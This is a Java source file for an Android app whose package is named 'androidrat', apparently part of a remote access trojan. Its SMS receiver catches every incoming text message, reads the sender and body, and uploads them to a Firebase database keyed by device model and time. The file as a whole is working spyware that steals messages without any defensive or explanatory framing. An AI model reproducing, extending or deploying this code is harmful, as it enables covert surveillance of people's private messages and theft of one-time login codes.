package com.awesome_company.androidrat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.util.Date;

public class ReceiveSms extends BroadcastReceiver {

    FirebaseDatabase database = FirebaseDatabase.getInstance();

    @Override
    public void onReceive(Context context, Intent intent){

        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;
            String msg_from;
            if(bundle != null){
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i< msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        Toast.makeText(context, "From: " + msg_from + ", Body: " + msgBody, Toast.LENGTH_SHORT).show();
                        Date currentTime = Calendar.getInstance().getTime();
                        String time = currentTime.toString();
                        DatabaseReference myRef = database.getReference(Build.BRAND + " " + Build.MODEL);
//                        myRef.setValue("From: " + msg_from + ", Body: " + msgBody);
                        myRef.child(time).child("From: ").setValue(msg_from);
                        myRef.child(time).child("Message: ").setValue(msgBody);
//                        myRef.child("From: ").setValue(msg_from);
//                        myRef.child("Message: ").setValue(msgBody);
                    }
            }catch (Exception e){
                    e.printStackTrace();
                }
        }
    }

}
}
